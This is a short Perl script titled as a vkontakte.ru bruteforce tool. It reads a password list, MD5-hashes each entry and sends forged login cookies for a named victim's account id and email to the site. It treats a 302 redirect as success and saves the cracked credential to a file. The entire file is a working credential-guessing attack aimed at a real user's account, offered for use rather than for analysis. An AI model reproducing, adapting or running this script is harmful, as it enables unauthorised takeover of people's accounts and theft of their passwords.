#########################
# vkontakte.ru bruteforce
# C!klodoL
#########################
use IO::Socket::INET;
use MD5;

$remixmid = stillru;	#id жертвы
$remixemail = "still.ru%40gmail.com";

open (pass, '<passl.txt');
@pass = <pass>;
close pass;
chomp @pass;

while (@pass[$i]){
system("cls");
$sock = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"vkontakte.ru",PeerPort=>"80");

$hash = MD5->hexhash(@pass[$i]);

$get = "HEAD http://vkontakte.ru/ HTTP/1.0\r\n".
	"Host: vkontakte.ru\r\n".
	"Accept: */*\r\n".
	"Content-Type: application/x-www-form-urlencoded\r\n".
	"User-Agent: Internet Explorer 6.0\r\n".
	"Cookie: remixchk=2; remixmid=$remixmid; remixemail=$remixemail; remixpass=$hash\r\n".
	"Connection: close\r\n\r\n";
	
print $sock $get;

$answ = <$sock>;
close $sock;
print "$answ\n";
if ($answ =~ /302 Found/){
   open (good, '>>good.txt');
   print good "$remixmid:@pass[$i]:$hash\n";
   print "$remixmid:@pass[$i]:$hash\n";
close good;
last;
   }
$i++;
}
